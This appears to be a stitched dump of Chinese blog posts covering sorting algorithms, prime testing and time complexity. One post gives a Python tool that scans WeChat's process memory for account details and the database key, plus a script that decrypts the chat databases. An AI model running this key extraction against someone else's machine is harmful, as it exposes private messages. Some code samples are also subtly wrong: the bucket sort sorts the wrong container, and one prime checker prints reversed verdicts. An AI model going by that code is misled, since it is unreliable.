WrongAnswer\n\n\nj的取值范围为[l…r-1]\n证明：\n假设j最终的值为r，说明只有一轮循环（两轮的话j至少会自减两次）\n说明q[r]&lt;=x因为要跳出do−while循环因为要跳出do-while循环\n说明i&gt;=r（while循环的结束条件），i为r或r+1必不可能成立必不可能成立\n说明i自增到了r，说明q[r]&gt;=x和q[l…r-1]&lt;x，\n得出q[r]=x和q[l…r-1]&lt;x的结论，但这与x=q[l+r&gt;&gt;1]矛盾\n反证法得出j&lt;r\n假设j可能小于l说明q[l…r]&gt;x，矛盾\n反证法得出j&gt;=l\n\n\n所以j的取值范围为[l…r-1]，不会造成无限划分和数组越界。\n\n 五、选择排序（Selection Sort）\n 原理\n首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕\n 步骤\nn个记录的直接选择排序可经过n-1趟直接选择排序得到有序结果。具体算法描述如下：\n\n初始状态：无序区为R[1…n]，有序区为空\n第i趟排序（i=1,2,3…n-1）开始时，当前有序区和无序区分别为R[1…i-1]和R(i…n)。该趟排序从当前无序区中选出关键字最小的记录R[k]，将它与无序区的第1个记录R交换，使R[1…i]和R[i+1…n)分别变为记录个数增加1个的新有序区和记录个数减少1个的新无序区\nn-1趟结束，数组有序化了\n\n 动画演示\n\n 代码实现\nvoid select_sort()&#123;    for (int i = 0; i &lt; n; i ++ )    &#123;        int k = i;        for (int j = i+1; j &lt; n; j ++ )        &#123;            if (a[j] &lt; a[k])                k = j;        &#125;        swap(a[i], a[k]);    &#125;&#125;\n 六、堆排序（Heap Sort）\n 原理\n堆是一种特殊的树形数据结构，即完全二叉树。堆分为大根堆和小根堆，大根堆为根节点的值大于两个子节点的值；小根堆为根节点的值小于两个子节点的值，同时根节点的两个子树也分别是一个堆\n\n堆排序是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：子结点的键值或索引总是小于（或者大于）它的父节点\n 步骤\n\n构建堆：将待排序序列构建成一个堆H[0…n-1]，从最后一个非叶子结点开始，从左至右，从下至上进行调整。根据升序或降序需求选择大顶堆或小顶堆，此时的堆顶元素，为最大或者最小元素\n把堆顶元素和堆尾元素互换，调整堆，重新使堆有序，此时堆顶元素为第二大元素\n重复以上步骤，直到堆变空\n\n 动画演示\n\n 代码实现\nvoid down(int u)&#123;    int t = u;    if (u&lt;&lt;1 &lt;= n &amp;&amp; h[u&lt;&lt;1] &lt; h[t]) t = u&lt;&lt;1;    if ((u&lt;&lt;1|1) &lt;= n &amp;&amp; h[u&lt;&lt;1|1] &lt; h[t]) t = u&lt;&lt;1|1;    if (u != t)    &#123;        swap(h[u], h[t]);        down(t);    &#125;&#125;int main()&#123;    for (int i = 1; i &lt;= n; i ++ ) cin &gt;&gt; h[i];    for (int i = n/2; i; i -- ) down(i);    while (true)    &#123;        if (!n) break;        cout &lt;&lt; h[1] &lt;&lt; &#x27; &#x27;;        h[1] = h[n];        n -- ;        down(1);    &#125;    return 0;&#125;\n 七、归并排序（Merge Sort）\n 原理\n该算法是采用分治法的一个非常典型的应用。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为2路归并\n 步骤\n\n把长度为n的输入序列分成两个长度为n/2的子序列\n对这两个子序列分别采用归并排序\n将两个排序好的子序列合并成一个最终的排序序列\n\n 动画演示\n\n 代码实现\nvoid merge_sort(int q[], int l, int r)&#123;    //递归的终止情况    if(l &gt;= r) return;    //第一步：分成子问题    int mid = l + r &gt;&gt; 1;    //第二步：递归处理子问题    merge_sort(q, l, mid ), merge_sort(q, mid + 1, r);    //第三步：合并子问题    int k = 0, i = l, j = mid + 1, tmp[r - l + 1];    while(i &lt;= mid &amp;&amp; j &lt;= r)        if(q[i] &lt;= q[j]) tmp[k++] = q[i++];        else tmp[k++] = q[j++];    while(i &lt;= mid) tmp[k++] = q[i++];    while(j &lt;= r) tmp[k++] = q[j++];    for(k = 0, i = l; i &lt;= r; k++, i++) q[i] = tmp[k];&#125;\n\ntmp保存的是q[l…mid],q[mid+1…r]中从小到大排序的所有数\n证明（第一个while循环）\n循环不变式：tmp[0…k-1]保存上述俩数组中从小到大排序的最小k个数\n1.初始\nk=0,tmp[0…k-1]为空，显然成立\n2.保持\n假设某轮循环开始之前，循环不变式成立\n若q[i]&lt;=q[j],则tmp[k]=q[i]\n其中q[i]&lt;=q[i+1…mid],q[i]&lt;=q[j]&lt;=q[j+1…r]\n∴q[i]是剩下的所有数中最小的一个\n当q[i]&gt;q[j]时，同理可以得到tmp[k]=q[j]是剩下数中最小的一个\n∴tmp[k]是剩下数中最小的一个\n∴k自增之后，下轮循环开始之前，tmp[0…k-1]保存从小到大排序的最小k个数\n3.终止\ni&gt;mid或j&gt;r\n则q[l…mid]和q[mid+1…r]其中一个数组的数都已遍历\ntmp[0…k-1]保存从小到大排序的最小k个数\n\n 八、基数排序（Radix Sort）\n 原理\n基数排序是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前\n 步骤\n\n取得数组中的最大数，并取得位数\narr为原始数组，从最低位开始取每个位组成radix数组\n对radix进行计数排序（利用计数排序适用于小范围数的特点）\n\n 动画演示\n\n 代码实现\nint maxbit()&#123;    int maxv = a[0];    for (int i = 1; i &lt; n; i ++ )        if (maxv &lt; a[i])            maxv = a[i];    int cnt = 1;    while (maxv &gt;= 10) maxv /= 10, cnt ++ ;    return cnt;&#125;void radixsort()&#123;    int t = maxbit();    int radix = 1;    for (int i = 1; i &lt;= t; i ++ )    &#123;        for (int j = 0; j &lt; 10; j ++ ) count[j] = 0;        for (int j = 0; j &lt; n; j ++ )        &#123;            int k = (a[j] / radix) % 10;            count[k] ++ ;        &#125;        for (int j = 1; j &lt; 10; j ++ ) count[j] += count[j-1];        for (int j = n-1; j &gt;= 0; j -- )        &#123;            int k = (a[j] / radix) % 10;            temp[count[k]-1] = a[j];            count[k] -- ;        &#125;        for (int j = 0; j &lt; n; j ++ ) a[j] = temp[j];        radix *= 10;    &#125;&#125;\n 九、计数排序（Counting Sort）\n 原理\n核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数\n 步骤\n\n找出待排序的数组中最大和最小的元素\n统计数组中每个值为i的元素出现的次数，存入数组C的第i项\n对所有的计数累加（从C中的第一个元素开始，每一项和前一项相加）\n反向填充目标数组：将每个元素i放在新数组的第Ci项，每放一个元素就将Ci减去1\n\n 动画演示\n\n 代码实现\nvoid counting_sort()&#123;    int sorted[N];    int maxv = a[0];    for (int i = 1; i &lt; n; i ++ )        if (maxv &lt; a[i])            maxv = a[i];    int count[maxv+1];    for (int i = 0; i &lt; n; i ++ ) count[a[i]] ++ ;    for (int i = 1; i &lt;= maxv; i ++ ) count[i] += count[i-1];    for (int i = n-1; i &gt;= 0; i -- )    &#123;        sorted[count[a[i]]-1] = a[i];        count[a[i]] -- ;    &#125;    for (int i = 0; i &lt; n; i ++ ) a[i] = sorted[i];&#125;\n 十、桶排序（Bucket Sort）\n 原理\n遍历原始序列确定最大值maxval和最小值minval，并确定桶的个数n，然后将待排序集合中处于同一个值域的元素存入同一个桶中，在桶内使用各种现有的算法进行排序；最后按照从小到大的顺序依次收集桶中的每一个元素，即为最终结果\n 步骤\n\n设置一个定量的数组当作空桶\n遍历输入数据，并且把数据一个一个放到对应的桶里去\n对每个不是空的桶进行排序\n从不是空的桶里把排好序的数据拼接起来\n\n桶排序是一种用空间换取时间的排序。桶的个数和大小都是我们人为设置的，而每个桶又要避免空桶的情况，所以我们在使用桶排序的时候即需要对待排序数列要求偏均匀，又要要求桶的设计兼顾效率和空间；数要相对均匀分布，桶的个数也要合理设计。在设计桶排序时，需要知道输入数据的上界和下界\n 动画演示\n\n 代码实现\n//桶排序 void BucketSort(int a[], int n)&#123;    int minval = a[0], maxval = a[0];    for(int i = 0; i &lt; n; i ++)&#123;//寻找原序列数组元素的最大值和最小值         minval = min(minval, a[i]);        maxval = max(maxval, a[i]);    &#125;    int bnum = 10;//桶中元素个数     int m = (maxval - minval) / bnum + 1;//桶的个数     vector&lt; vector&lt;int&gt; &gt; bucket(m);    //收集,将元素入相应的桶中. 减偏移量是为了将元素映射到更小的区间内,省内存     for(int i = 0; i &lt; n; i ++) bucket[(a[i] - minval) / bnum].push_back(a[i]);    //将桶内元素排序     for(int i = 0; i &lt; m; i ++) sort(bucket.begin(), bucket.end());    //收集, 将各个桶中的元素收集到一起     for(int i = 0, k = 0; i &lt; m; i ++)&#123;        for(int j = 0; j &lt; bucket[i].size(); j ++)&#123;            data[k ++] = bucket[i][j];        &#125;    &#125;&#125;","tags":["Summary","LeetCode"]},{"title":"导出WeChat&QQ聊天记录","url":"/2024/11/20/%E5%AF%BC%E5%87%BAWeChat-QQ%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/","content":" 导出WeChat&amp;QQ聊天记录\n本文仅供学习交流使用，严禁用于商业用途及非法用途，否则后果自负！\n参考资料\n 微信\n微信历史版本下载\nSharpWxDump\nwx_dump_rs\nwechat-dump-rs（支持微信4.0版本）\n留痕\n\n获取基址、密钥详见如下（有逆向基础最好）\n\n\nSharpWxDump：./CE获取基址.md\n\n\n留痕：./app/decrypt/get_bias_addr.py\n\n\nwechat-dump-rs\n\n\nwx_dump_rs\n\n\n\n\n 获取基址\n拿VisualStudio2022打开SharpWxDump项目后报错缺少.NET4.0，在此链接下载对应版本（右侧的Download package）\n下载完之后修改后缀名为.zip然后直接解压\n打开如下地址\nmicrosoft.netframework.referenceassemblies.net48.1.0.3\\build\\.NETFramework\n将v4.n文件夹复制到\nC:\\Program Files (x86)\\Reference Assemblies\\Microsoft\\Framework\\.NETFramework\n此处提供如下三种方法获取基址\n\n可根据SharpWxDump帮助文档利用CE手动获取基址（建议参考上面提到的其他几个项目）\n\n获取到后打开Program.cs仿照格式填写，保存，选择release、x86编译运行可得到key\n\n\nwechat-dump-rs一键获取密钥Key\n\n\n自用代码（微信昵称、微信账号、微信手机号、微信KEY都有）\n\n致谢：留痕\n\n\n\nimport ctypesimport hashlibimport jsonimport osimport reimport sysimport psutilfrom win32com.client import Dispatchfrom pymem import Pymemimport pymemimport hmacReadProcessMemory = ctypes.windll.kernel32.ReadProcessMemoryvoid_p = ctypes.c_void_pKEY_SIZE = 32DEFAULT_PAGESIZE = 4096DEFAULT_ITER = 64000def validate_key(key, salt, first, mac_salt):    byteKey = hashlib.pbkdf2_hmac(&quot;sha1&quot;, key, salt, DEFAULT_ITER, KEY_SIZE)    mac_key = hashlib.pbkdf2_hmac(&quot;sha1&quot;, byteKey, mac_salt, 2, KEY_SIZE)    hash_mac = hmac.new(mac_key, first[:-32], hashlib.sha1)    hash_mac.update(b&#x27;\\x01\\x00\\x00\\x00&#x27;)    if hash_mac.digest() == first[-32:-12]:        return True    else:        return Falsedef get_exe_bit(file_path):    &quot;&quot;&quot;    获取 PE 文件的位数: 32 位或 64 位    :param file_path:  PE 文件路径(可执行文件)    :return: 如果遇到错误则返回 64    &quot;&quot;&quot;    try:        with open(file_path, &#x27;rb&#x27;) as f:            dos_header = f.read(2)            if dos_header != b&#x27;MZ&#x27;:                print(&#x27;get exe bit error: Invalid PE file&#x27;)                return 64            # Seek to the offset of the PE signature            f.seek(60)            pe_offset_bytes = f.read(4)            pe_offset = int.from_bytes(pe_offset_bytes, byteorder=&#x27;little&#x27;)            # Seek to the Machine field in the PE header            f.seek(pe_offset + 4)            machine_bytes = f.read(2)            machine = int.from_bytes(machine_bytes, byteorder=&#x27;little&#x27;)            if machine == 0x14c:                return 32            elif machine == 0x8664:                return 64            else:                print(&#x27;get exe bit error: Unknown architecture: %s&#x27; % hex(machine))                return 64    except IOError:        print(&#x27;get exe bit error: File not found or cannot be opened&#x27;)        return 64def get_exe_version(file_path):    &quot;&quot;&quot;    获取 PE 文件的版本号    :param file_path:  PE 文件路径(可执行文件)    :return: 如果遇到错误则返回    &quot;&quot;&quot;    file_version = Dispatch(&quot;Scripting.FileSystemObject&quot;).GetFileVersion(file_path)    return file_versiondef find_all(c: bytes, string: bytes, base_addr=0):    &quot;&quot;&quot;    查找字符串中所有子串的位置    :param c: 子串 b&#x27;123&#x27;    :param string: 字符串 b&#x27;123456789123&#x27;    :return:    &quot;&quot;&quot;    return [base_addr + m.start() for m in re.finditer(re.escape(c), string)]class BiasAddr:    def __init__(self, account, mobile, name, key, db_path):        print(f&quot;[+] 初始化参数:&quot;)        print(f&quot;    账号: &#123;account&#125;&quot;)        print(f&quot;    手机: &#123;mobile&#125;&quot;)        print(f&quot;    名称: &#123;name&#125;&quot;)        print(f&quot;    密钥: &#123;key[:10]&#125;...&quot; if key else &quot;    密钥: 无&quot;)        print(f&quot;    数据库路径: &#123;db_path&#125;\\n&quot;)                self.account = account.encode(&quot;utf-8&quot;)        self.mobile = mobile.encode(&quot;utf-8&quot;)        self.name = name.encode(&quot;utf-8&quot;)        self.key = bytes.fromhex(key) if key else b&quot;&quot;        self.db_path = db_path if db_path and os.path.exists(db_path) else &quot;&quot;        self.process_name = &quot;WeChat.exe&quot;        self.module_name = &quot;WeChatWin.dll&quot;        self.pm = None  # Pymem 对象        self.is_WoW64 = None  # True: 32位进程运行在64位系统上 False: 64位进程运行在64位系统上        self.process_handle = None  # 进程句柄        self.pid = None  # 进程ID        self.version = None  # 微信版本号        self.process = None  # 进程对象        self.exe_path = None  # 微信路径        self.address_len = None  # 4 if self.bits == 32 else 8  # 4字节或8字节        self.bits = 64 if sys.maxsize &gt; 2 ** 32 else 32  # 系统：32位或64位    def get_process_handle(self):        try:            print(&quot;[+] 正在获取微信进程...&quot;)            self.pm = Pymem(self.process_name)            self.pm.check_wow64()            self.is_WoW64 = self.pm.is_WoW64            self.process_handle = self.pm.process_handle            self.pid = self.pm.process_id            self.process = psutil.Process(self.pid)            self.exe_path = self.process.exe()            self.version = get_exe_version(self.exe_path)            print(f&quot;[+] 进程信息:&quot;)            print(f&quot;    PID: &#123;self.pid&#125;&quot;)            print(f&quot;    路径: &#123;self.exe_path&#125;&quot;)            print(f&quot;    版本: &#123;self.version&#125;&quot;)            print(f&quot;    WoW64: &#123;self.is_WoW64&#125;\\n&quot;)            version_nums = list(map(int, self.version.split(&quot;.&quot;)))  # 将版本号拆分为数字列表            if version_nums[0] &lt;= 3 and version_nums[1] &lt;= 9 and version_nums[2] &lt;= 2:                self.address_len = 4            else:                self.address_len = 8            return True, &quot;&quot;        except pymem.exception.ProcessNotFound:            return False, &quot;[-] WeChat No Run&quot;    def search_memory_value(self, value: bytes, module_name=&quot;WeChatWin.dll&quot;):        # 创建 Pymem 对象        module = pymem.process.module_from_name(self.pm.process_handle, module_name)        ret = self.pm.pattern_scan_module(value, module, return_multiple=True)        ret = ret[-1] - module.lpBaseOfDll if len(ret) &gt; 0 else 0        return ret    def get_key_bias1(self):        try:            byteLen = self.address_len  # 4 if self.bits == 32 else 8  # 4字节或8字节            keyLenOffset = 0x8c if self.bits == 32 else 0xd0            keyWindllOffset = 0x90 if self.bits == 32 else 0xd8            module = pymem.process.module_from_name(self.process_handle, self.module_name)            keyBytes = b&#x27;-----BEGIN PUBLIC KEY-----\\n...&#x27;            publicKeyList = pymem.pattern.pattern_scan_all(self.process_handle, keyBytes, return_multiple=True)            keyaddrs = []            for addr in publicKeyList:                keyBytes = addr.to_bytes(byteLen, byteorder=&quot;little&quot;, signed=True)  # 低位在前                may_addrs = pymem.pattern.pattern_scan_module(self.process_handle, module, keyBytes,                                                              return_multiple=True)                if may_addrs != 0 and len(may_addrs) &gt; 0:                    for addr in may_addrs:                        keyLen = self.pm.read_uchar(addr - keyLenOffset)                        if keyLen != 32:                            continue                        keyaddrs.append(addr - keyWindllOffset)            return keyaddrs[-1] - module.lpBaseOfDll if len(keyaddrs) &gt; 0 else 0        except:            return 0    def search_key(self, key: bytes):        key = re.escape(key)  # 转义特殊字符        key_addr = self.pm.pattern_scan_all(key, return_multiple=False)        key = key_addr.to_bytes(self.address_len, byteorder=&#x27;little&#x27;, signed=True)        result = self.search_memory_value(key, self.module_name)        return result    def get_key_bias2(self, wx_db_path):        addr_len = get_exe_bit(self.exe_path) // 8        db_path = wx_db_path        def read_key_bytes(h_process, address, address_len=8):            array = ctypes.create_string_buffer(address_len)            if ReadProcessMemory(h_process, void_p(address), array, address_len, 0) == 0: return &quot;None&quot;            address = int.from_bytes(array, byteorder=&#x27;little&#x27;)  # 逆序转换为int地址（key地址）            key = ctypes.create_string_buffer(32)            if ReadProcessMemory(h_process, void_p(address), key, 32, 0) == 0: return &quot;None&quot;            key_bytes = bytes(key)            return key_bytes        def verify_key(key, wx_db_path):            KEY_SIZE = 32            DEFAULT_PAGESIZE = 4096            DEFAULT_ITER = 64000            with open(wx_db_path, &quot;rb&quot;) as file:                blist = file.read(5000)            salt = blist[:16]            byteKey = hashlib.pbkdf2_hmac(&quot;sha1&quot;, key, salt, DEFAULT_ITER, KEY_SIZE)            first = blist[16:DEFAULT_PAGESIZE]            mac_salt = bytes([(salt[i] ^ 58) for i in range(16)])            mac_key = hashlib.pbkdf2_hmac(&quot;sha1&quot;, byteKey, mac_salt, 2, KEY_SIZE)            hash_mac = hmac.new(mac_key, first[:-32], hashlib.sha1)            hash_mac.update(b&#x27;\\x01\\x00\\x00\\x00&#x27;)            if hash_mac.digest() != first[-32:-12]:                return False            return True        phone_type1 = &quot;iphone\\x00&quot;        phone_type2 = &quot;android\\x00&quot;        phone_type3 = &quot;ipad\\x00&quot;        pm = pymem.Pymem(&quot;WeChat.exe&quot;)        module_name = &quot;WeChatWin.dll&quot;        MicroMsg_path = os.path.join(db_path, &quot;MSG&quot;, &quot;MicroMsg.db&quot;)        module = pymem.process.module_from_name(pm.process_handle, module_name)        type1_addrs = pm.pattern_scan_module(phone_type1.encode(), module, return_multiple=True)        type2_addrs = pm.pattern_scan_module(phone_type2.encode(), module, return_multiple=True)        type3_addrs = pm.pattern_scan_module(phone_type3.encode(), module, return_multiple=True)        type_addrs = type1_addrs if len(type1_addrs) &gt;= 2 else type2_addrs if len(            type2_addrs) &gt;= 2 else type3_addrs if len(type3_addrs) &gt;= 2 else &quot;None&quot;        if type_addrs == &quot;None&quot;:            return 0        for i in type_addrs[::-1]:            for j in range(i, i - 2000, -addr_len):                key_bytes = read_key_bytes(pm.process_handle, j, addr_len)                if key_bytes == &quot;None&quot;:                    continue                if verify_key(key_bytes, MicroMsg_path):                    return j - module.lpBaseOfDll        return 0    def run(self, logging_path=False, version_list_path=None):        if not self.get_process_handle()[0]:            return &#123;&#125;                    print(&quot;[+] 开始搜索内存偏移...&quot;)        mobile_bias = self.search_memory_value(self.mobile, self.module_name)        print(f&quot;    手机号偏移: 0x&#123;mobile_bias:X&#125;&quot;)                name_bias = self.search_memory_value(self.name, self.module_name)        print(f&quot;    用户名偏移: 0x&#123;name_bias:X&#125;&quot;)                account_bias = self.search_memory_value(self.account, self.module_name)        print(f&quot;    账号偏移: 0x&#123;account_bias:X&#125;&quot;)                print(&quot;[+] 开始搜索密钥偏移...&quot;)        key_bias = 0        key_bias = self.get_key_bias1()        if key_bias &lt;= 0 and self.key:            print(&quot;    方法1失败，尝试方法2...&quot;)            key_bias = self.search_key(self.key)        if key_bias &lt;= 0 and self.db_path:            print(&quot;    方法2失败，尝试方法3...&quot;)            key_bias = self.get_key_bias2(self.db_path)        print(f&quot;    密钥偏移: 0x&#123;key_bias:X&#125;\\n&quot;)        rdata = &#123;self.version: [name_bias, account_bias, mobile_bias, 0, key_bias]&#125;        print(&quot;[+] 搜索完成!&quot;)        print(f&quot;    结果: &#123;json.dumps(rdata, indent=4)&#125;\\n&quot;)        return rdatadef get_info_without_key(h_process, address, n_size=64):    array = ctypes.create_string_buffer(n_size)    if ReadProcessMemory(h_process, void_p(address), array, n_size, 0) == 0: return &quot;None&quot;    array = bytes(array).split(b&quot;\\x00&quot;)[0] if b&quot;\\x00&quot; in array else bytes(array)    text = array.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)    return text.strip() if text.strip() != &quot;&quot; else &quot;None&quot;def get_user_input():    print(&quot;\\n[*] 请输入以下信息:&quot;)    account = input(&quot;微信账号: &quot;).strip()    mobile = input(&quot;手机号码: &quot;).strip()    name = input(&quot;用户名称: &quot;).strip()        print(&quot;\\n[*] 以下信息为可选，直接回车可跳过:&quot;)    key = input(&quot;密钥(可选): &quot;).strip()    db_path = input(&quot;数据库路径(可选): &quot;).strip()        return account, mobile, name, key, db_pathdef main():    try:        account, mobile, name, key, db_path = get_user_input()                if not all([account, mobile, name]):            print(&quot;\\n[-] 错误: 账号、手机号和用户名为必填项&quot;)            sys.exit(1)                    bias = BiasAddr(            account=account,            mobile=mobile,            name=name,            key=key,            db_path=db_path        )        result = bias.run()                if not result:            print(&quot;\\n[-] 未找到微信进程或搜索失败&quot;)            sys.exit(1)                except KeyboardInterrupt:        print(&quot;\\n\\n[-] 用户取消操作&quot;)        sys.exit(0)    except Exception as e:        print(f&quot;\\n[-] 发生错误: &#123;str(e)&#125;&quot;)        sys.exit(1)if __name__ == &#x27;__main__&#x27;:    main()\n数据库文件在Document\\WeChat Files\\&lt;微信原始ID&gt;\\Msg\\Multi下，这里是各个数据库简述\n使用如下脚本解密数据库\npip3 install psutil pymem pywin32 pycryptodome\nfrom Crypto.Cipher import AESimport ctypesimport hashlibimport hmacSQLITE_FILE_HEADER = bytes(&#x27;SQLite format 3&#x27;, encoding=&#x27;ASCII&#x27;) + bytes(1)IV_SIZE = 16HMAC_SHA1_SIZE = 20KEY_SIZE = 32DEFAULT_PAGESIZE = 4096DEFAULT_ITER = 64000input_pass = input(&#x27;请输入密钥: &#x27;)input_dir = input(&#x27;请输入数据库文件路径: &#x27;)password = bytes.fromhex(input_pass.replace(&#x27; &#x27;, &#x27;&#x27;))with open(input_dir, &#x27;rb&#x27;) as (f):    blist = f.read()print(len(blist))salt = blist[:16]key = hashlib.pbkdf2_hmac(&#x27;sha1&#x27;, password, salt, DEFAULT_ITER, KEY_SIZE)first = blist[16:DEFAULT_PAGESIZE]mac_salt = bytes([x ^ 58 for x in salt])mac_key = hashlib.pbkdf2_hmac(&#x27;sha1&#x27;, key, mac_salt, 2, KEY_SIZE)hash_mac = hmac.new(mac_key, digestmod=&#x27;sha1&#x27;)hash_mac.update(first[:-32])hash_mac.update(bytes(ctypes.c_int(1)))if hash_mac.digest() == first[-32:-12]:    print(&#x27;Decryption Success&#x27;)else:    print(&#x27;Password Error&#x27;)blist = [blist[i:i + DEFAULT_PAGESIZE] for i in range(DEFAULT_PAGESIZE, len(blist), DEFAULT_PAGESIZE)]with open(input_dir, &#x27;wb&#x27;) as (f):    f.write(SQLITE_FILE_HEADER)    t = AES.new(key, AES.MODE_CBC, first[-48:-32])    f.write(t.decrypt(first[:-48]))    f.write(first[-48:])    for i in blist:        t = AES.new(key, AES.MODE_CBC, i[-48:-32])        f.write(t.decrypt(i[:-48]))        f.write(i[-48:])\n可使用Navicat等软件打开，有了各个数据库的基础后直接查询，或者使用wx_dump_rs、留痕可视化查看\n QQ\n因无RE进阶知识，此处放相关链接\n\n[讨论]qq数据库逆向有什么好方法？\n[调试逆向] 撬开PC QQ的本地SQLite数据库（适用于Msg3.0.db等）\n[原创]某聊天工具消息记录数据库文件解密逆向分析\nqq-win-db-key\n\n","tags":["Cyber Security"]},{"title":"对于求素数的一些个人思考","url":"/2022/11/05/%E5%AF%B9%E4%BA%8E%E6%B1%82%E7%B4%A0%E6%95%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%AA%E4%BA%BA%E6%80%9D%E8%80%83/","content":"看到一道题\n\n求100之内的素数\n\n动手尝试后查阅相关资料看到一篇文章：求质数算法的N种境界-试除法和初级筛法\n原文链接\n//法一。当数据不是素数时需要算很多才能停:(#include &lt;stdio.h&gt;int main() &#123;    int x;    scanf_s(&quot;%d&quot;, &amp;x);    int i;    for (i = 2; i &lt; x; i++)    &#123;        if (x % i == 0)        &#123;            break;        &#125;    &#125;    if (i &lt; x)    &#123;        printf(&quot;%d不是素数\\n&quot;,x);    &#125;    else &#123;        printf(&quot;%d是素数\\n&quot;,x);    &#125;    return 0;&#125;\n//法二。:)#include &lt;stdio.h&gt;int main()&#123;    int x;    scanf_s(&quot;%d&quot;, &amp;x);    int i;    int isPrime = 1;    for (i = 2; i &lt; x; i++)    &#123;        if (x % i == 0)        &#123;            isPrime = 0;            break;        &#125;    &#125;    if (isPrime == 1)    &#123;        printf(&quot;%d不是素数\\n&quot;,x);    &#125;    else &#123;        printf(&quot;%d是素数\\n&quot;,x);    &#125;    return 0;&#125;\n//法三。=)#include&lt;stdio.h&gt;#include&lt;math.h&gt;#define N 15000int main()&#123;\tint a, i, j, k, num, sum = 0;\tprintf(&quot;Q1:要求多少以内的素数?\\nQ2:要多少个素数?\\n&quot;);\tprintf(&quot;Q1请输入0,Q2请输入1\\n请输入:&quot;);\tscanf_s(&quot;%d&quot;, &amp;a);\twhile (a != 1 &amp;&amp; a != 2)\t&#123;\t\tprintf(&quot;请重新输入:&quot;);\t\tscanf_s(&quot;%d&quot;, &amp;a);\t&#125;\tif (a == 0)\t&#123;\t\tprintf(&quot;请输入数字:&quot;);\t\tscanf_s(&quot;%d&quot;, &amp;num);\t\tfor (i = 2; i &lt;= num; i++)\t\t&#123;\t\t\tk = sqrt(i);\t\t\tfor (j = 2; j &lt;= k; j += 1)\t\t\t&#123;\t\t\t\tif (i % j == 0)\t\t\t\t&#123;\t\t\t\t\tbreak;\t\t\t\t&#125;\t\t\t&#125;\t\t\tif (j &gt; k)\t\t\t&#123;\t\t\t\tprintf(&quot;%d\\t&quot;, i);\t\t\t\tsum++;\t\t\t\tif (sum % 10 == 0)\t\t\t\t&#123;\t\t\t\t\tprintf(&quot;\\n&quot;);\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t\tprintf(&quot;\\n%d内一共有%d个素数&quot;, num, sum);\t&#125;\telse if (a == 1)\t&#123;\t\tprintf(&quot;请输入数字:&quot;);\t\tscanf_s(&quot;%d&quot;, &amp;num);\t\tfor (i = 2; i &lt;= N; i++)\t\t&#123;\t\t\tk = sqrt(i);\t\t\tfor (j = 2; j &lt;= k; j += 1)\t\t\t&#123;\t\t\t\tif (i % j == 0)\t\t\t\t&#123;\t\t\t\t\tbreak;\t\t\t\t&#125;\t\t\t&#125;\t\t\tif (j &gt; k)\t\t\t&#123;\t\t\t\tprintf(&quot;%d\\t&quot;, i);\t\t\t\tsum++;\t\t\t\tif (sum % 10 == 0)\t\t\t\t&#123;\t\t\t\t\tprintf(&quot;\\n&quot;);\t\t\t\t&#125;\t\t\t\tif (sum == num)\t\t\t\t&#123;\t\t\t\t\tbreak;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;\treturn 0;&#125;\n附质数筛法工作过程GIF图\n\n","tags":["Summary"]},{"title":"LeetCode知识补充","url":"/2025/01/24/LeetCode%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/","content":" LeetCode知识补充\n对还不清楚的知识作补充，每个点中自己熟悉的部分已略过（有的part为了知识完整性即使已知也会补充）\n\n部分参考资料\n\nHello算法\n王道数据结构\n代码随想录\n 时间复杂度\n前言\n\n稳定：如果a原本在b前面，且a=b，排序之后a仍然在b的前面\n不稳定：如果a原本在b的前面，且a=b，排序之后a可能会出现在b的后面\n\n\n\n快速记忆平均时间复杂度及稳定性\n\n村里有两只做事很稳的动物：插帽龟和统计鸡。插帽龟喜欢去插人家堆起来的帽子，统计鸡喜欢做加减乘除。但有天插帽龟挑选帽子插的时候，恩姓长老看见就慌了，恩老大喊：“快点归还给堆”\n\nO(1)常数阶&lt;O(log2n)对数阶&lt;O(n)线性阶&lt;O(nlog2n)线性对数阶&lt;O(n2)平方阶&lt;O(n3)立方阶&lt;O(2n)指数阶&lt;O(n!)阶乘阶&lt;O(nn)\n常对幂指阶\n\n顺序执行的代码只会影响常数项，可以忽略\n只需挑循环中的一个基本操作分析它的执行次数与n的关系即可\n如果有多层嵌套循环，只需关注最深层循环循环了几次\n\n\n 练习\n\n计算该算法的时间复杂度T(n)\n\nvoid loveYou(int n)&#123;//n为问题规模    int i=1;    while(i&lt;=n)&#123;        i=i*2;//每次翻倍        printf(&quot;I Love You %d\\n&quot;,i);    &#125;    printf(&quot;I Love You More Than %d\\n&quot;,n);&#125;\n设最深层循环的语句频度（总共循环的次数）为x，则由循环条件可知，循环结束时刚好满足2x&gt;n\nx=log2n+1\nT(n)=O(x)=O(log2n)\n\n计算该算法的时间复杂度T(n)\n\nvoid loveYou(int flag[], int n)&#123;//n为问题规模    printf(&quot;I Am Iron Man\\n&quot;);    for(int i=0; i&lt;n; i++)&#123;//从第一个元素开始查找        if(flag[i]==n)&#123;//找到元素n            printf(&quot;I Love You %d\\n&quot;,n);            break;//找到后立即跳出循环        &#125;    &#125;&#125;//flag数组中乱序存放了1~n这些数int 